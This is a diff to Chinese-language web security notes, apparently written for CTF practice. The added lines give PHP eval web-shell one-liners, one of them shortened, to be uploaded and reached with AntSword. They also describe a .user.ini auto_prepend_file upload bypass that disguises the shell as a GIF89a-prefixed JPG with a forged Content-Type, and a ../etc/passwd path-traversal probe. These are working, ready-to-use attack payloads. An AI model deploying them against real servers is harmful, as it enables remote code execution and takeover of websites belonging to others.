@@ -321,6 +321,8 @@ chr() 也是Python的内置函数，用于返回指定Unicode编码的字符。�
 
 ## 代码注入
 
+- `/etc/passwd` 是一个在 Unix 和类 Unix 系统中的系统文件，用于存储所有用户的基本信息。可以用该文件来测试 Web 网站是否暴露了目录。（有时候网站暴露的目录只能用相对路径访问，如 ../../../../etc/passwd）
+
 ### PHP
 
 - index.php 的默认路径是 /var/www/html/index.php
@@ -363,6 +365,12 @@ $@ 替代空字符串
 ```php
 <?php eval(@$_POST['a']); ?>
 ```
+或者，用这段代码的缩减版
+
+```php
+<?= eval($_POST['a']);?>
+```
+
 - 2.将该文件上传到服务器(连接地址就是该文件路径，密码是上面输入的'a')
 - 3.使用中国蚁剑连接该文件即可
 
@@ -385,7 +393,37 @@ SetHandler application/x-httpd-php
 </FilesMatch>
 ```
 
- 
+然后访问上传的 php 文件即可
+
+ ###### 更进一步的 .user.ini 绕过
+
+首先上传 .user.ini 文件（配合 Burp 的 Reapter，把 Content-Type: application/octet-stream 修改为 Content-Type: image/jpg）
+
+GIF89a 是图片的文件头，用于绕过服务端判断
+
+原理：
+
+1. .user.ini 文件：在 PHP 5.3.0 版本以后，引入了一个新的特性，用户可以在每个目录下面放置一个名为 ".user.ini" 的文件，这个文件中可以包含一些 PHP 的配置项，这些配置项会影响到当前目录以及子目录中的 PHP 执行环境。这就为我们提供了一个可能的攻击点，如果我们能够上传一个 ".user.ini" 文件，并在其中设置一些特定的配置项，那么我们就可能对服务器的 PHP 执行环境进行修改。
+2. auto_prepend_file 配置项：这是 PHP 的一个配置项，它的作用是在 PHP 解析器处理每个 PHP 文件之前，都会先处理这个配置项指定的文件。也就是说，如果我们在 ".user.ini" 文件中设置了 auto_prepend_file，那么这个设置的文件会在所有的 PHP 文件之前被执行。
+3. 在"a.jpg"文件的开头添加"GIF89a"头部，使得这个文件在视觉上表现为一张正常的 JPG 图像，但实际上包含了恶意的PHP代码。
+
+【PS: macOS 的访达中按住 `command + shift + .` 显示隐藏文件】
+
+```
+GIF89a
+auto_prepend_file=a.jpg
+```
+
+编辑和上传 a.jpg 文件（注意和前一步一样，Content-Type 为 image/jpg）
+
+```php
+GIF89a
+<?= eval($_POST['a']);?>
+```
+
+示例上传位置为 `uploads/a.jpg`，然后用蚁剑连接 `uploads/index.php` 文件即可，密码是 `a`。
+
+(经测试，a.jpg 必须在 .user.ini 之后上传)
 
 ##### 伪协议
 
